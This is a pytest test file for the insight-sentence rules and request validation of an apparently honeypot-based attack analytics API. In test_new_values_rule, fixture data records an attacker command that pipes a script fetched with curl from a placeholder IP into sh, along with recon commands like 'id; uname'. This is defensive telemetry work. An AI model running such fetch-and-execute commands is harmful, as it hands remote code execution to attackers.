"""Insight sentence builders and rules (pure) plus request validation (no database)."""

from collections.abc import AsyncIterator
from datetime import UTC, datetime, timedelta
from typing import Any

import httpx
import pytest
from sqlalchemy.ext.asyncio import create_async_engine
from suckerpot_db import create_session_factory

from api import insights_rules as r
from api.insights import site_home_from_env
from api.main import create_app

NOW = datetime(2026, 10, 24, 10, 0, tzinfo=UTC)  # a Saturday
SINCE = NOW - timedelta(days=7)


def mk(**kw: Any) -> r.Facts:
    return r.Facts(since=SINCE, until=NOW, **kw)


@pytest.fixture
async def client() -> AsyncIterator[httpx.AsyncClient]:
    engine = create_async_engine(
        "postgresql+asyncpg://u:p@127.0.0.1:1/d", connect_args={"timeout": 1}
    )
    app = create_app(create_session_factory(engine), enable_live=False)
    async with app.router.lifespan_context(app):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app), base_url="http://t/api/v1"
        ) as c:
            yield c
    await engine.dispose()


@pytest.mark.parametrize(
    ("cur", "prev", "text"),
    [
        (30, 10, "tripled"),
        (62, 20, "tripled"),
        (20, 10, "doubled"),
        (19, 10, "doubled"),
        (14, 10, "up 40%"),
        (26, 10, "up 160%"),
        (42, 10, "up 4.2x"),
        (50, 10, "up 5x"),
    ],
)
def test_describe_change(cur: int, prev: int, text: str) -> None:
    assert r.describe_change(cur, prev) == text


def test_describe_change_rejects_zero_previous() -> None:
    with pytest.raises(ValueError):
        r.describe_change(5, 0)


@pytest.mark.parametrize(
    ("since", "text"),
    [
        (NOW.replace(hour=0), "midnight"),
        (NOW.replace(hour=4), "earlier today"),
        (NOW - timedelta(days=1), "yesterday"),
        (NOW - timedelta(days=3), "Wednesday"),
        (NOW - timedelta(days=6), "Sunday"),
        (NOW - timedelta(days=7), "Oct 17"),
        (NOW - timedelta(days=20), "Oct 4"),
    ],
)
def test_relative_day(since: datetime, text: str) -> None:
    assert r.relative_day(since, NOW) == text


def test_span_and_number_formatting() -> None:
    assert r.describe_span(NOW - timedelta(hours=24), NOW) == "in the last 24 hours"
    assert r.describe_span(NOW - timedelta(days=7), NOW) == "in the last 7 days"
    assert r.fmt_int(1234567) == "1,234,567"


def test_surge_sentence_has_thousands_separators() -> None:
    s = r.surge_sentence("PHP2Shell exploit attempts", 1236, 412, "Tuesday")
    assert s == "PHP2Shell exploit attempts tripled since Tuesday (1,236 vs 412)."


def test_other_sentences() -> None:
    assert r.new_value_sentence("command", "id; uname", 37, "in the last 7 days") == (
        "A command never seen before showed up 37 times in the last 7 days: id; uname."
    )
    assert r.new_value_sentence("asn", "AS64500", 1, "in the last 7 days").startswith(
        "A network (ASN) never seen before showed up once"
    )
    assert r.success_sentence(12, 3, "Monday") == (
        "Successful logins up 4x since Monday (12 vs 3)."
    )
    assert r.campaign_sentence("AS64500 (Example Net)", 1240, 2000, "in the last 7 days") == (
        "AS64500 (Example Net) accounts for 62% of all sessions in the last 7 days "
        "(1,240 of 2,000)."
    )
    assert r.exploit_sentence("Malware download attempts", 1, "in the last 7 days") == (
        "Malware download attempts appeared for the first time: 1 session in the last 7 days, "
        "none in the 90 days before."
    )
    assert r.geo_shift_sentence("RU", 0.22, 0.05, "in the last 7 days") == (
        "Sessions from RU rose from 5% to 22% of all traffic in the last 7 days."
    )


def test_clean_text_strips_control_chars_and_truncates() -> None:
    assert r.clean_text("a\x1b[31m\r\nb") == "a [31m b"
    assert len(r.clean_text("x" * 500)) == 60
    assert r.clean_text("x" * 500).endswith("…")


def test_link_is_relative_ui_url() -> None:
    link = r.ui_link("/attacks", SINCE, NOW, tag="php2shell", sensor="web")
    assert link == (
        "/attacks?tag=php2shell&sensor=web&since=2026-10-17T10%3A00%3A00Z&until=2026-10-24T10%3A00%3A00Z"
    )


def test_quiet_traffic_makes_no_claims() -> None:
    facts = mk(
        total=(15, 4),
        tags={"php2shell": (15, 4)},
        sensors={"web": (15, 4)},
        success=(4, 1),
        exploit_current={"php2shell": 15},
        new_values={"command": [r.NewValue("id", 9)]},
        top_ip=("203.0.113.7", 15),
        asns={"64500": (15, 4)},
        countries={"NL": (15, 4)},
    )
    items = r.build_insights(facts, NOW)
    # Only the first-exploit rule has no volume floor: one session of a severe tag is news.
    assert [i.id for i in items] == ["exploit-first-php2shell"]


def test_surge_thresholds() -> None:
    low = mk(tags={"recon": (19, 5)})
    assert r.build_insights(low, NOW) == []
    no_base = mk(tags={"recon": (100, 4)})
    assert r.build_insights(no_base, NOW) == []
    mild = mk(tags={"recon": (22, 20)})
    assert r.build_insights(mild, NOW) == []
    ok = mk(tags={"recon": (30, 10)})
    [item] = r.build_insights(ok, NOW)
    assert item.id == "surge-tag-recon"
    assert item.severity == "notice"
    assert item.sentence == "Reconnaissance sessions tripled since Oct 17 (30 vs 10)."
    assert item.evidence.model_dump() == {
        "metric": "sessions_by_tag",
        "current": 30,
        "previous": 10,
        "ratio": 3.0,
    }
    assert item.link.startswith("/attacks?tag=recon&since=")


def test_ranking_severity_then_magnitude_and_cap() -> None:
    facts = mk(
        total=(500, 200),
        tags={
            "php2shell": (60, 20),  # severe, magnitude 180
            "malware-drop": (90, 30),  # severe, magnitude 270
            "mirai": (400, 100),  # warning
            "recon": (300, 100),  # notice
        },
        sensors={"web": (60, 20)},
    )
    items = r.build_insights(facts, NOW)
    assert [i.id for i in items] == [
        "surge-tag-malware-drop",
        "surge-tag-php2shell",
        "surge-tag-mirai",
    ]
    assert len(r.build_candidates(facts, NOW)) <= r.MAX_CANDIDATES


def test_exploit_not_first_when_seen_before() -> None:
    facts = mk(exploit_current={"php2shell": 4}, exploit_seen_before={"php2shell"})
    assert r.build_insights(facts, NOW) == []
    fresh = mk(exploit_current={"php2shell": 4})
    [item] = r.build_insights(fresh, NOW)
    assert item.kind == "exploit"
    assert item.severity == "severe"
    assert item.sentence.startswith(
        "PHP2Shell exploit attempts appeared for the first time: 4 sessions"
    )


def test_success_spike_needs_volume() -> None:
    assert r.build_insights(mk(success=(4, 2)), NOW) == []
    assert r.build_insights(mk(success=(9, 6)), NOW) == []
    [item] = r.build_insights(mk(success=(12, 3)), NOW)
    assert (item.kind, item.severity) == ("success", "warning")


def test_campaign_asn_and_ip() -> None:
    facts = mk(
        total=(200, 100),
        asns={"64500": (130, 10), "64501": (70, 90)},
        asn_orgs={"64500": "Example Net"},
        top_ip=("203.0.113.7", 70),
    )
    items = {i.id: i for i in r.build_insights(facts, NOW)}
    asn = items["campaign-asn-64500"]
    assert asn.severity == "warning"
    assert asn.sentence.startswith("AS64500 (Example Net) accounts for 65% of all sessions")
    assert asn.link.startswith("/attackers?asn=64500&since=")
    assert items["campaign-ip-203.0.113.7"].link.startswith("/attackers?q=203.0.113.7&")
    small = mk(total=(40, 40), asns={"1": (40, 0)}, top_ip=("192.0.2.1", 40))
    assert r.build_insights(small, NOW) == []


def test_geo_shift() -> None:
    facts = mk(total=(200, 200), countries={"RU": (44, 10), "NL": (100, 100), "US": (56, 90)})
    [item] = r.build_insights(facts, NOW)
    assert item.id == "geo-shift-ru"
    assert (
        item.sentence == "Sessions from RU rose from 5% to 22% of all traffic in the last 7 days."
    )
    assert item.link.startswith("/attacks?country=RU&since=")


def test_new_values_rule() -> None:
    facts = mk(
        new_values={
            "command": [r.NewValue("curl -s http://192.0.2.50/x | sh", 37), r.NewValue("id", 3)],
            "username": [r.NewValue("deploy", 9)],
            "asn": [r.NewValue("64500", 25)],
        },
        asn_orgs={"64500": "Example Net"},
    )
    items = {i.id: i for i in r.build_insights(facts, NOW)}
    assert set(items) == {"new-command", "new-asn"}
    assert items["new-command"].link.startswith("/trends?field=command&")
    assert "AS64500 (Example Net)" in items["new-asn"].sentence
    assert items["new-asn"].link.startswith("/attackers?asn=64500&")


@pytest.mark.parametrize(
    "query",
    [
        "since=2026-10-24T10:00:00",
        "since=2026-10-24T10:00:00Z&until=2026-10-24T09:00:00Z",
        "since=2026-01-01T00:00:00Z&until=2026-10-24T09:00:00Z",
    ],
)
async def test_insights_rejects_bad_windows(client: httpx.AsyncClient, query: str) -> None:
    assert (await client.get(f"/insights?{query}")).status_code == 422


def test_site_home_defaults_and_clamping(monkeypatch: pytest.MonkeyPatch) -> None:
    for name in ("SITE_HOME_LAT", "SITE_HOME_LON", "SITE_HOME_LABEL"):
        monkeypatch.delenv(name, raising=False)
    home = site_home_from_env()
    assert (home.lat, home.lon, home.label) == (46.8, 8.2, "Switzerland")
    monkeypatch.setenv("SITE_HOME_LAT", "48.8566")
    monkeypatch.setenv("SITE_HOME_LON", "2.3522")
    monkeypatch.setenv("SITE_HOME_LABEL", "France\x07" + "x" * 200)
    home = site_home_from_env()
    assert (home.lat, home.lon) == (48.9, 2.4)  # rounded to ~11 km on purpose
    assert home.label.startswith("Francex") and len(home.label) == 64
    monkeypatch.setenv("SITE_HOME_LAT", "999")
    monkeypatch.setenv("SITE_HOME_LON", "nope")
    home = site_home_from_env()
    assert (home.lat, home.lon) == (46.8, 8.2)


async def test_site_settings_endpoint(client: httpx.AsyncClient) -> None:
    r_ = await client.get("/settings/site")
    assert r_.status_code == 200
    assert set(r_.json()["home"]) == {"lat", "lon", "label"}


def test_brute_force_insight() -> None:
    facts = mk(
        brute_force=[("192.0.2.9", "mysql", 120), ("192.0.2.10", "redis", 40)], brute_total=200
    )
    [item] = r.build_insights(facts, NOW)
    assert item.id == "brute-force-mysql-192.0.2.9"
    assert item.kind == "brute_force"
    assert item.sentence == (
        "192.0.2.9 guessed credentials 120 times on MySQL in the last 7 days, "
        "60% of all 200 login attempts."
    )
    assert item.link.startswith("/attackers?q=192.0.2.9&since=")


def test_brute_force_needs_volume() -> None:
    assert r.build_insights(mk(brute_force=[("192.0.2.9", "mysql", 99)], brute_total=99), NOW) == []
    spread = mk(brute_force=[("192.0.2.9", "mysql", 49)], brute_total=300)
    assert r.build_insights(spread, NOW) == []


def test_new_tag_severities() -> None:
    for tag in ("container-escape", "sql-rce", "eternalblue"):
        assert r.TAG_SEVERITY[tag] == "severe"
    for tag in ("db-ransom", "redis-rogue-master", "sip-fraud", "persistence"):
        assert r.TAG_SEVERITY[tag] == "warning"


def test_rdp_tag_severities() -> None:
    assert r.TAG_SEVERITY["bluekeep"] == "warning"
    assert r.TAG_SEVERITY["weak-credentials"] == "warning"
    assert "rdp-cleartext" not in r.TAG_SEVERITY  # informational: default notice
    assert r.TAG_LABELS["bluekeep"]
